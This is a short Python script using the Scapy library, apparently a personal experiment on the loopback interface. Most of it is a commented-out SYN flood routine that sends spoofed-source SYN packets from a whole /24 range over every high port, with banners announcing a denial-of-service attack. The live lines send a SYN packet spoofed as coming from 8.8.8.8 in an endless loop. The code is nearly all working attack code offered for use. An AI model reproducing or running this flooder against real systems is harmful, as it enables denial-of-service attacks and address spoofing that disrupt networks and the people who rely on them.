from scapy.all import *
import signal

conf.iface="lo0"
conf.L3socket = L3RawSocket


# def main():
#     src_net = "192.168.250."
#     dst_ip = '127.0.0.1'
#     dst_port = 5555
#     sleep = 0
#     # verbose = arguments["--verbose"]
#     # very_verbose = arguments["--very-verbose"]
#
#     signal.signal(signal.SIGINT, lambda n, f: sys.exit(0))
#
#     print("\n###########################################")
#     print("# Starting Denial of Service attack...")
#     print(f"# Target: {dst_ip}")
#     print("###########################################\n")
#     for src_host in range(1,254):
#         # if verbose or very_verbose:
#         #     print(f"[*] Sending spoofed SYN packets from {src_net}{src_host}")
#         #     print("--------------------------------------------")
#
#         for src_port in range(1024, 65535):
#             # if very_verbose:
#             #     print(f"[+] Sending a spoofed SYN packet from {src_net}{src_host}:{src_port}")
#
#             # Build the packet
#             src_ip = src_net + str(src_host)
#             network_layer = IP(src=src_ip, dst=dst_ip)
#             transport_layer = TCP(sport=src_port, dport=dst_port, flags="S")
#
#             # Send the packet
#             send(network_layer/transport_layer, verbose=False)
#
#             # if sleep != 0:
#             #     time.sleep(sleep)
#
#     print("[+] Denial of Service attack finished.")
#
#
# if __name__ == '__main__':
#     # arguments = docopt(__doc__, version="SYN Flooder 1.5")
#     main()

packet = IP(src='8.8.8.8', dst='127.0.0.1')/TCP(sport=9090, dport=5555, flags='S', seq=5, window=6)

send(packet, inter=.001, loop=1)


# i = 1
#
# while 1:
#     rsv = sr(packet, inter=.001)
#     print('packet sent: ', i)
#     i += 1


# ls(packet)
#
# ans, unans = srloop(packet, inter=0.3, retry=2, timeout=4)
#
# ans.summary()
#
# unans.summary()

# rsv = sr(packet)

# print(packet.show())